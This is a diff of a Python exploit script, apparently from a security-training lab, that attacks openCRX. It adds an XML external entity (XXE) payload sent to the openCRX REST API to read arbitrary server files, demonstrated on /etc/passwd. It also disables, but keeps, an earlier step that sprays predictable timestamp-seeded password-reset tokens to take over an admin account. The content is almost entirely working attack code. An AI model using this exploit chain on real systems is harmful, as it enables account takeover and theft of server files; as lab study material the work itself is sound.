@@ -6,6 +6,9 @@ import json
 import time
 requests.packages.urllib3.disable_warnings()
 
+def b64encode(s):
+	return base64.b64encode(s.encode()).decode()
+
 def current_milli_time():
 	return int(time.time() * 1000)
 
@@ -174,6 +177,35 @@ def login(ip, username, password):
 
 	return s
 
+# 9.3.6.3: Create script to parse results of XXE and clearly display fiel contents
+def read_file(ip, session, username, password, filename):
+	print()
+	print(f"Reading file contents of file {filename}")
+
+	brkpoint = "hhhhhbreakpoint" # Unique word to sandwich output
+	xml = ("<?xml version=\"1.0\"?>"
+	"<!DOCTYPE data ["
+	"<!ELEMENT data ANY >"
+	f"<!ENTITY lastname SYSTEM \"file://{filename}\">"
+	"]>"
+	"<org.opencrx.kernel.account1.Contact>"
+	f"<lastName>{brkpoint}&lastname;{brkpoint}</lastName>"
+	"<firstName>Tom</firstName>"
+	"</org.opencrx.kernel.account1.Contact>")
+
+	auth_header = f"Basic {b64encode(username + ':' + password)}"
+	headers = {
+		'Content-Type': 'application/xml',
+		'Authorization': auth_header
+	}
+
+	target = f"http://{ip}:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account"
+	r = session.post(target, data=xml, headers=headers)
+	file_contents = r.text.split(brkpoint)[1]
+	print(file_contents)
+	
+	return file_contents
+
 def main():
 	if len(sys.argv) != 2:
 		print ("(+) usage: %s <target>" % sys.argv[0])
@@ -184,21 +216,23 @@ def main():
 	username = "admin-Standard"
 	password = "PwnedPassword!"
 
-	low = current_milli_time()
-	requestResetPassword(ip, username)
-	high = current_milli_time()
-	print(f"Timestamp seed range: {{{low} - {high}}}, with {high-low+1} tokens")
+	# low = current_milli_time()
+	# requestResetPassword(ip, username)
+	# high = current_milli_time()
+	# print(f"Timestamp seed range: {{{low} - {high}}}, with {high-low+1} tokens")
 
-	tokens = generate_tokens(low, high)
-	tokens2 = gen_tokens(low, high)
-	assert tokens == tokens2, "Issue generating tokens"
-	print(f"Generated {high-low+1} tokens")
+	# tokens = generate_tokens(low, high)
+	# tokens2 = gen_tokens(low, high)
+	# assert tokens == tokens2, "Issue generating tokens"
+	# print(f"Generated {high-low+1} tokens")
 
-	print("Spraying tokens at target")
-	resetPassword(ip, username, password, tokens)
+	# print("Spraying tokens at target")
+	# resetPassword(ip, username, password, tokens)
 
 	print("Logging in")
 	session = login(ip, username, password)
+
+	read_file(ip, session, username, password, "/etc/passwd")
 
 if __name__ == '__main__':
 	main()
